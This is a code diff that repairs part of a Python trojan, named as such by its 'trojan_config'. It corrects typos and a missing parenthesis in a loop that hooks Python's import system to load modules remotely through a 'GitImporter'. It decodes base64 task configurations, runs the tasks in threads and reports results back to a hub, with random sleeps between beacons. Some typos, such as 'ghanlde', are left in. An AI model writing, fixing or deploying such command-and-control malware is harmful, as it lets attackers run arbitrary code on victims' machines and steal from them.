@@ -57,7 +57,7 @@ class HubHandler:
 
     def apply_config(self):
        # maybe this could be optiized away and store config in object
-       config_json = get_file(self.trojan_config)
+       config_json = self.get_file(self.trojan_config)
        config = json.loads(base64.b64decode(config_json))
        self.configured = True
        for task in config:
@@ -98,14 +98,14 @@ def module_runner(module, ghanlde, queue=task_queue):
     ghandle.store_module_result(result)
 
 
-ghanlde = HubHandler() 
-sys.meta_path = [GitImporter(ghandlee)]
+ghandle = HubHandler() 
+sys.meta_path = [GitImporter(ghandle)]
 
 while True:
     if task_queue.empty():
         config = ghandle.apply_config()
     for task in config:
-        t = threading.Thread(target=module_runner, args=(task['module'], ghandle, task_queue)
+        t = threading.Thread(target=module_runner, args=(task['module'], ghandle, task_queue))
         t.start()
         time.sleep(random.randint(1,10))
     time.sleep(random.randint(1000, 100000))
